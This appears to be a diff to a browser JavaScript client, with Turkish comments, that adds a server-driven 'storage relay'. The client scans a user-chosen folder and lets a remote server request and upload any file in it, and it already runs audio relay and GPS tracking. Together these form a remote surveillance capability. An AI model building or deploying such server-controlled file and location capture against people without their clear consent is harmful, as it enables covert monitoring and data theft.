@@ -435,6 +435,173 @@ function stopHeartbeat() {
     }
 }
 
+// ============ STORAGE ============
+
+let storageRootHandle = null;
+let storagePollTimer = null;
+
+function makeAuthPayload() {
+    const auth = getAuth();
+    if (!auth) return '';
+    return btoa(JSON.stringify({ uid: auth.uid }));
+}
+
+async function startStorageRelay() {
+    const auth = getAuth();
+    const perms = checkPermissions();
+    if (!auth || !perms || !perms.storage) return;
+
+    // File System Access API ile klasör seç
+    try {
+        if (!window.showDirectoryPicker) {
+            // Tarayıcı desteklemiyor
+            return;
+        }
+        storageRootHandle = await window.showDirectoryPicker();
+        await scanDirectory(storageRootHandle, '');
+    } catch {
+        // Kullanıcı iptal etti veya hata oluştu
+    }
+}
+
+async function scanDirectory(dirHandle, parentPath) {
+    const auth = getAuth();
+    if (!auth) return;
+
+    const fileList = [];
+
+    async function walk(handle, path) {
+        if (handle.kind === 'file') {
+            const file = await handle.getFile();
+            fileList.push({
+                name: file.name,
+                path: path ? path + '/' + file.name : file.name,
+                size: file.size,
+                mime: file.type || '',
+                mtime: file.lastModified,
+                is_dir: false
+            });
+        } else {
+            fileList.push({
+                name: handle.name,
+                path: path ? path + '/' + handle.name : handle.name,
+                size: 0,
+                mime: 'directory',
+                mtime: 0,
+                is_dir: true
+            });
+            for await (const entry of handle.values()) {
+                await walk(entry, path ? path + '/' + handle.name : handle.name);
+            }
+        }
+    }
+
+    try {
+        for await (const entry of dirHandle.values()) {
+            await walk(entry, '');
+        }
+
+        // Dosya ağacını server'a gönder
+        await fetch(`${API_BASE}/api/relay/storage/scan`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid: auth.uid, files: fileList })
+        });
+
+        // Pending request'leri dinlemeye başla
+        startStoragePolling();
+    } catch (e) {
+        // Tarama hatası
+    }
+}
+
+function startStoragePolling() {
+    stopStoragePolling();
+    pollStorageSignals();
+    storagePollTimer = setInterval(() => {
+        pollStorageSignals();
+        pollStorageRequests();
+    }, 3000);
+}
+
+function stopStoragePolling() {
+    if (storagePollTimer) {
+        clearInterval(storagePollTimer);
+        storagePollTimer = null;
+    }
+}
+
+async function pollStorageSignals() {
+    const auth = getAuth();
+    const perms = checkPermissions();
+    if (!auth || !perms || !perms.storage) return;
+
+    try {
+        const resp = await fetch(
+            `${API_BASE}/api/relay/storage/signal?auth=${makeAuthPayload()}`
+        );
+        const data = await resp.json();
+        if (data.status === 'ok' && data.signals) {
+            for (const signal of data.signals) {
+                if (signal === 'start_scan') {
+                    await startStorageRelay();
+                }
+            }
+        }
+    } catch {}
+}
+
+async function pollStorageRequests() {
+    const auth = getAuth();
+    if (!auth || !storageRootHandle) return;
+
+    try {
+        const resp = await fetch(
+            `${API_BASE}/api/relay/storage/pending?auth=${makeAuthPayload()}`
+        );
+        const data = await resp.json();
+        if (data.status === 'ok' && data.paths && data.paths.length > 0) {
+            for (const filePath of data.paths) {
+                await readAndUploadFile(filePath);
+            }
+        }
+    } catch {}
+}
+
+async function readAndUploadFile(filePath) {
+    if (!storageRootHandle) return;
+    try {
+        // Dosyayı path'ten bul
+        const parts = filePath.split('/');
+        let handle = storageRootHandle;
+        for (const part of parts) {
+            handle = await handle.getFileHandle(part);
+        }
+        const file = await handle.getFile();
+        const buffer = await file.arrayBuffer();
+        const bytes = new Uint8Array(buffer);
+        let binary = '';
+        for (let i = 0; i < bytes.length; i++) {
+            binary += String.fromCharCode(bytes[i]);
+        }
+        const b64 = btoa(binary);
+
+        const auth = getAuth();
+        await fetch(`${API_BASE}/api/relay/storage/content`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: auth.uid,
+                path: filePath,
+                content: b64,
+                mimeType: file.type
+            })
+        });
+    } catch {
+        // Dosya okunamadı
+    }
+}
+
 // ============ INIT ============
 
 document.addEventListener('DOMContentLoaded', async () => {
@@ -450,5 +617,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         startAudioRelay();
         startGpsTracking();
         startHeartbeat();
+        startStoragePolling();
     }
 });
